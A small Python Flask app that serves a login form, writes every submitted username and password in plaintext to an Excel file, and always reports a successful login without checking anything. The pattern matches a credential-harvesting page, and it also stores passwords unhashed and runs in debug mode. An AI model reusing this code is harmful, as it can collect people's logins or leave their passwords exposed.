from flask import Flask, render_template, request, redirect, url_for
import openpyxl
import os

app = Flask(__name__)

# Define the Excel file path
excel_file = 'login_data.xlsx'

# Function to initialize the Excel file if it doesn't exist
def init_excel():
    if not os.path.exists(excel_file):
        wb = openpyxl.Workbook()
        sheet = wb.active
        sheet['A1'] = 'Username/Email'
        sheet['B1'] = 'Password'
        wb.save(excel_file)

# Route to display the login form
@app.route('/')
def index():
    return render_template('login.html')

# Route to handle form submission
@app.route('/submit', methods=['POST'])
def submit():
    username = request.form['username']
    password = request.form['password']

    # Open the Excel file and write the data
    wb = openpyxl.load_workbook(excel_file)
    sheet = wb.active

    # Find the next available row
    row = sheet.max_row + 1

    # Insert the data into the Excel file
    sheet[f'A{row}'] = username
    sheet[f'B{row}'] = password

    # Save the Excel file
    wb.save(excel_file)

    # Redirect to success page
    return redirect(url_for('success'))

# Route to show the success page
@app.route('/success')
def success():
    return '''
    <html>
    <body>
        <h1>Login Successful!</h1>
        <p>Your data has been saved successfully.</p>
    </body>
    </html>
    '''

# Initialize the Excel file if needed
init_excel()

if __name__ == '__main__':
    app.run(debug=True)
